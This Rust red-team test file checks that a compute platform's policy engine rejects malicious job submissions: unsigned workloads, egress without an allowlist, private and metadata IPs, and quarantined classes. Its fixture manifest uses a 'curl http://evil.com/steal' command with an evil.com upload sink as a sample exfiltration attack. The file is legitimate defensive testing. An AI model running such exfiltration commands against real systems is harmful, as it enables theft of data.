//! Red Team Scenario 1: Malicious workload submission.
//!
//! Attack: Submit workloads designed to abuse the platform — egress to
//! exfiltrate data, runtime code fetch, LAN scanning, unsigned artifacts.

use worldcompute::policy::decision::Verdict;
use worldcompute::policy::engine::{evaluate, SubmissionContext};
use worldcompute::policy::rules::{check_egress_allowlist, check_workload_class_with_quarantine};
use worldcompute::sandbox::egress::{is_blocked_destination, EgressPolicy};
use std::net::{IpAddr, Ipv4Addr};

fn attacker_ctx() -> SubmissionContext {
    SubmissionContext {
        submitter_peer_id: "12D3KooWAttacker".into(),
        submitter_public_key: vec![0xAA; 32],
        submitter_hp_score: 5,
        submitter_banned: false,
        epoch_submission_count: 0,
        epoch_submission_quota: 100,
    }
}

fn malicious_manifest(egress_bytes: u64, sig: Vec<u8>) -> worldcompute::scheduler::manifest::JobManifest {
    let cid = worldcompute::data_plane::cid_store::compute_cid(b"malicious payload").unwrap();
    worldcompute::scheduler::manifest::JobManifest {
        manifest_cid: None, name: "data-exfil".into(),
        workload_type: worldcompute::scheduler::WorkloadType::OciContainer,
        workload_cid: cid, command: vec!["curl".into(), "http://evil.com/steal".into()],
        inputs: Vec::new(), output_sink: "http://evil.com/upload".into(),
        resources: worldcompute::scheduler::ResourceEnvelope {
            cpu_millicores: 1000, ram_bytes: 512*1024*1024, gpu_class: None,
            gpu_vram_bytes: 0, scratch_bytes: 1024*1024*1024,
            network_egress_bytes: egress_bytes, walltime_budget_ms: 3_600_000,
        },
        category: worldcompute::scheduler::JobCategory::PublicGood,
        confidentiality: worldcompute::scheduler::ConfidentialityLevel::Public,
        verification: worldcompute::scheduler::VerificationMethod::ReplicatedQuorum,
        acceptable_use_classes: vec![worldcompute::acceptable_use::AcceptableUseClass::Scientific],
        max_wallclock_ms: 3_600_000, submitter_signature: sig,
    }
}

#[test]
fn attack_1a_unsigned_workload_rejected() {
    let manifest = malicious_manifest(0, vec![0u8; 64]);
    let ctx = attacker_ctx();
    let d = evaluate(&manifest, &ctx).unwrap();
    assert_eq!(d.verdict, Verdict::Reject, "Unsigned (all-zero sig) workload must be rejected");
}

#[test]
fn attack_1b_egress_request_without_allowlist_rejected() {
    let manifest = malicious_manifest(1024 * 1024, vec![1u8; 64]);
    let check = check_egress_allowlist(&manifest);
    assert!(!check.passed, "Egress without approved allowlist must be rejected");
}

#[test]
fn attack_1c_data_exfil_to_private_ip_blocked() {
    assert!(is_blocked_destination(&IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1))));
    assert!(is_blocked_destination(&IpAddr::V4(Ipv4Addr::new(192, 168, 1, 1))));
    assert!(is_blocked_destination(&IpAddr::V4(Ipv4Addr::new(169, 254, 169, 254))));
}

#[test]
fn attack_1d_default_deny_egress_blocks_all() {
    let policy = EgressPolicy::deny_all();
    assert!(!policy.egress_allowed, "Default-deny must block all outbound");
}

#[test]
fn attack_1e_quarantined_class_blocked() {
    let manifest = malicious_manifest(0, vec![1u8; 64]);
    let quarantined = vec!["Scientific".to_string()];
    let check = check_workload_class_with_quarantine(&manifest, &quarantined);
    assert!(!check.passed, "Quarantined workload class must be blocked");
}
